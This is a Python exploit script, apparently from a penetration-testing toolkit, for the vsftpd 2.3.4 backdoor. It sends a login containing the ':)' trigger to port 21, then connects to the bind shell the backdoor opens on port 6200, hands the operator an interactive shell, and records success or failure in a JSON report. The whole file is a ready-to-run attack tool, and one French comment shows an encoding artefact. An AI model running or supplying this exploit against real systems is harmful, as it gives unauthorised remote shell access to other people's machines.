from telnetlib import Telnet
import argparse
import sys
import time
import json
import os

def save_results(result, file_path='report/exploit.json'):
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
    else:
        data = []

    data.append(result)

    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

parser = argparse.ArgumentParser(description='vsftpd 2.3.4 exploit', usage=f'python3 {sys.argv[0]} -host ip_address', epilog=f'EXAMPLE - python3 %(prog)s -host 192.168.168.128')

parser.add_argument('-host', metavar="ip address", dest='host', help="input the ip address of the vulnerable host", required=True)

args = parser.parse_args()
host = args.host

if len(sys.argv) < 3:
    parser.print_help()
    sys.exit()

portFTP = "21"

user = "USER hackerman:)"
password = "PASS pass"

print("If it takes too long to connect to the host, check if the host is running vsftpd!")
time.sleep(2)

try:
    tn = Telnet(host, portFTP)
    print(f"[+] Opening Connection to {host} on port 21: Done")
    time.sleep(1)
    tn.read_until(b"(vsFTPd 2.3.4)")
    tn.write(user.encode('ascii') + b"\n")
    tn.read_until(b"password.")
    tn.write(password.encode('ascii') + b"\n")
    tn.close()
except Exception as e:
    print(f"[-] Failed to connect to FTP: {e}")
    sys.exit()

time.sleep(5)
print(f"[+] Opening Connection to {host} on port 6200: Done")

try:
    tn2 = Telnet(host, 6200)
    print("[+] Success, shell opened")
    print("[*] Send `exit` to quit shell")
    tn2.interact()
    result = {
        "host": host,
        "portFTP": portFTP,
        "portShell": 6200,
        "status": "success"
    }
except Exception as e:
    print(f"[-] Failed to connect to shell: {e}")
    result = {
        "host": host,
        "portFTP": portFTP,
        "portShell": 6200,
        "status": "failure",
        "error": str(e)
    }

# Sauvegarder le rÃ©sultat
save_results(result)

print(f"Result saved to 'report/exploit.json'")